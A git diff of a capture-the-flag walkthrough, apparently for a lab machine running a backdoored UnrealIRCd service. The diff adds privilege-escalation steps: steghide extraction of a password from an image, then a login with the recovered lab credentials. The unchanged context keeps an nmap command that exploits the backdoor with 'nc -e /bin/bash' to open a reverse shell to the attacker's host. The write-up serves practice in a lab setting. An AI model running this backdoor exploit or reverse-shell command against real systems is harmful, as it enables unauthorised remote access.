@@ -70,7 +70,7 @@ nmap -p 6697,8067,65534 --script=irc-unrealircd-backdoor 10.10.10.117
 nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117
 ```
 
-+ Get the shell,
++ Get the low level shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1a5b205-1807-4db2-8333-5c924009a39d)
 
@@ -87,13 +87,29 @@ export SHELL=bash
 stty rows 55 columns 285
 ```
 
-+ There's no permission to read the user flag.
++ There's no permission to read the user flag, and we need to escalate privileges.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54a47658-1c3e-4daa-ac61-9b5ce93d48b7)
 
 
-## Privilege Escalation
-+ x
+## Privilege Escalation: from 'ircd' to 'djmardov'
++ In **/home/djmardov/Documents**, there's a hidden file **.backup**.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cd93b71-8d2b-4e62-ad71-4cc5ff375314)
+
++ Take note of `UPupDOWNdownLRlrBAbaSSss` with the reference to steg.
++ Then download the emoji image file on **http://10.10.10.117/** irc home page: `wget 10.10.10.117/irked.jpg`
++ Try to extract data from image **irked.jpg** with discovered passphrase `UPupDOWNdownLRlrBAbaSSss`: `steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8f73a461-00a4-487a-b18e-cbc48d325ae6)
+
++ Discovered **djmardov**'s password `Kab6h+m+bbp2J:HG`.
++ Login with `djmardov`:`Kab6h+m+bbp2J:HG` credentials.
++ Get the user flag with djmardov's privileges.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9d597387-811b-42a8-94dd-cdf4ced48cb8)
+
+
 
 
 # References & Alternatives
